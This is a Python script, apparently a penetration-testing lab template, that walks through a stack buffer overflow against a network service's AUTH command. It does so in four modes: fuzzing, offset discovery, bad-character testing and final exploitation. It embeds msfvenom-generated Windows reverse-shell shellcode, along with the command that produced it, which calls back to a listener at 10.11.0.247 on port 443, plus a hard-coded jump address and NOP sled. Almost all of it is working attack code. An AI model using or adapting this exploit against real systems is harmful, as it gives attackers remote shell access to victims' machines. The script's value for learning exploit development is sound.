#!/usr/bin/python
import time, struct, sys
import socket as so
import argparse

#mode 1
def fuzz(host, port):

	try:
		buffer=["A"]
		counter=100
		while len(buffer) <= 30:
		        buffer.append("A"*counter)
		        counter=counter+200
	
	
	
		for string in buffer:
		       	print "Fuzzing AUTH with %s bytes" % len(string)
		       	s=so.socket(so.AF_INET, so.SOCK_STREAM)
			s.connect((host, port))
		       	print repr(s.recv(1024)) 	#prints received banner
		       	s.send('AUTH ' + string + '\r\n')
#			print repr(s.recv(1024))	#prints response
		       	s.send('exit\r\n')
			time.sleep(1)   # delays for 1 second. 
		       	s.close()
	except:
		print "[!] connection refused"
		sys.exit()

uniqueString = ("output from /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l #####")


#mode 2
def targetedFuzz(host, port):

        try:
#step 1: gen unique string and check output in EIP
		buffer = uniqueString 

#step 2: check the offset by inputting the value found in the EIP
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l ##### -q EIP_value = B * ##

#step 3: test accuracy of offset, ensure EIP is 42424242, set C * ## to keep total string length same as step 1
#eg unique = 1000, offset = 800 == C * (1000-4-800)
#		buffer = "A" * 1040 + 'B' * 4 + 'C' * (1100-1040-4)

#step 4: add 500, check that there is enough space for shellcode, dial it down as needed if error, validate with calc.exe programmer mode
#		buffer = "\x41" * 1040 + "\x42" * 4 + "\x43" * (1100-1040-4+500)

#step 5 (final): try with exact length of shellcode
#                buffer = "\x41" * 1040 + "\x42" * 4 + "\x43" * 390

		print "Fuzzing with unique string" 
                s=so.socket(so.AF_INET, so.SOCK_STREAM)
                s.connect((host, port))
                print repr(s.recv(1024))        #prints received banner
                s.send('AUTH ' + buffer + '\r\n')
		print "\nDone!"
                s.close()
        except:
                print "[!] connection refused"
		sys.exit()

#\x00 known bad null char
#\x0a line feed
#\x0d carrage return
badHexBak = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )


badHex = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )



#mode 3
def badChars(host, port, offset):
#run with specified offset
        try:
                buffer = 'A' * offset + 'B' * 4 + badHex

                print "Overflowing AUTH function with bad character list"
                s=so.socket(so.AF_INET, so.SOCK_STREAM)
                s.connect((host, port))
                print repr(s.recv(1024))        #prints received banner
                s.send('AUTH ' + buffer + '\r\n')
#               print repr(s.recv(1024))        #prints response
                s.close()
        except:
                print "[!] connection refused"
		sys.exit()

#msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.247 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00"
shellcode = ("\xba\x94\xf6\x1a\xb0\xda\xc7\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x31\x57\x12\x03\x57\x12\x83\x7b\x0a\xf8\x45\x7f\x1b\x7f"
"\xa5\x7f\xdc\xe0\x2f\x9a\xed\x20\x4b\xef\x5e\x91\x1f\xbd\x52"
"\x5a\x4d\x55\xe0\x2e\x5a\x5a\x41\x84\xbc\x55\x52\xb5\xfd\xf4"
"\xd0\xc4\xd1\xd6\xe9\x06\x24\x17\x2d\x7a\xc5\x45\xe6\xf0\x78"
"\x79\x83\x4d\x41\xf2\xdf\x40\xc1\xe7\xa8\x63\xe0\xb6\xa3\x3d"
"\x22\x39\x67\x36\x6b\x21\x64\x73\x25\xda\x5e\x0f\xb4\x0a\xaf"
"\xf0\x1b\x73\x1f\x03\x65\xb4\x98\xfc\x10\xcc\xda\x81\x22\x0b"
"\xa0\x5d\xa6\x8f\x02\x15\x10\x6b\xb2\xfa\xc7\xf8\xb8\xb7\x8c"
"\xa6\xdc\x46\x40\xdd\xd9\xc3\x67\x31\x68\x97\x43\x95\x30\x43"
"\xed\x8c\x9c\x22\x12\xce\x7e\x9a\xb6\x85\x93\xcf\xca\xc4\xfb"
"\x3c\xe7\xf6\xfb\x2a\x70\x85\xc9\xf5\x2a\x01\x62\x7d\xf5\xd6"
"\x85\x54\x41\x48\x78\x57\xb2\x41\xbf\x03\xe2\xf9\x16\x2c\x69"
"\xf9\x97\xf9\x3e\xa9\x37\x52\xff\x19\xf8\x02\x97\x73\xf7\x7d"
"\x87\x7c\xdd\x15\x22\x87\xb6\x13\xb8\x87\xb1\x4c\xbc\x87\x3c"
"\x36\x49\x61\x54\x58\x1c\x3a\xc1\xc1\x05\xb0\x70\x0d\x90\xbd"
"\xb3\x85\x17\x42\x7d\x6e\x5d\x50\xea\x9e\x28\x0a\xbd\xa1\x86"
"\x22\x21\x33\x4d\xb2\x2c\x28\xda\xe5\x79\x9e\x13\x63\x94\xb9"
"\x8d\x91\x65\x5f\xf5\x11\xb2\x9c\xf8\x98\x37\x98\xde\x8a\x81"
"\x21\x5b\xfe\x5d\x74\x35\xa8\x1b\x2e\xf7\x02\xf2\x9d\x51\xc2"
"\x83\xed\x61\x94\x8b\x3b\x14\x78\x3d\x92\x61\x87\xf2\x72\x66"
"\xf0\xee\xe2\x89\x2b\xab\x03\x68\xf9\xc6\xab\x35\x68\x6b\xb6"
"\xc5\x47\xa8\xcf\x45\x6d\x51\x34\x55\x04\x54\x70\xd1\xf5\x24"
"\xe9\xb4\xf9\x9b\x0a\x9d")

#mode 4: complete mona step before this mode
def exploit(host, port, offset):

        try:	
		exploitJump = ("\x71\x1D\xD1\x65")	#mem address in reverse for little endian
		#test offset and memory jump address w/ buffer before exploit
#step 1: test that exploit jump actually moves to shellcode location
		buffer = 'A' * offset + exploitJump + "\x90" * 16 + 'C' * 351

#step 2: exploit, have nc or handler listening before running this
#		buffer = 'A' * offset + exploitJump + "\x90" * 16 + shellcode

		print "Exploiting AUTH function"
                s=so.socket(so.AF_INET, so.SOCK_STREAM)
                s.connect((host, port))
                print repr(s.recv(1024))        #prints received banner
                s.send('AUTH ' + buffer + '\r\n')
#	        print repr(s.recv(1024))        #prints response
                s.close()
        except:
                print "[!] connection refused"
        	sys.exit()

def main():
        parse = argparse.ArgumentParser()

	try:
        	parse.add_argument("host", help='Target IP address')
                parse.add_argument("port", type=int, help='TCP port, 1-65535')
		parse.add_argument("mode", type=int, help='1: Fuzzer, 2: unique string fuzz, 3: Bad Character test, 4: Exploit')
		#build optional "offset" option
		#take final buffer amount and output to unique string gen
                args = parse.parse_args()

#manually set offset here after mode 2 complete
		offset = 1040

	except IndexError:
        	print "[+] Usage %s host port mode" % sys.argv[0]
        	sys.exit()
	
	
	if args.mode == 1:
		fuzz(args.host, args.port);
        elif args.mode == 2:
                targetedFuzz(args.host, args.port);
	elif args.mode == 3:
		badChars(args.host, args.port, offset);
	elif args.mode == 4:
                exploit(args.host, args.port, offset);


if __name__ == "__main__":
	main()
